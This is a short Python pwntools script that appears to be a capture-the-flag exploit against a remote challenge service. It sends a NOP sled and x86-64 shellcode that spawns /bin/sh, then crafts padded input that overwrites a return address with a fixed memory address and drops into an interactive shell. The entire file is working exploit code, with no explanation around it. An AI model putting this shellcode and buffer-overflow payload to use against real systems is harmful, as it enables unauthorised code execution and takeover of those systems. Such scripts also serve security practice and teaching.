from pwn import *
s=remote("stack.overflow.fail", 9000)
print(s.recv(1024))
#pause()
s.send("\x90"*20+"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"+"\n")
s.send("+\n")
s.send("1\n")
s.send("2"*143+"+"+"3"*8+p64(0x601090)+"\n")
print(s.recv(4096))

s.interactive()
s.close()
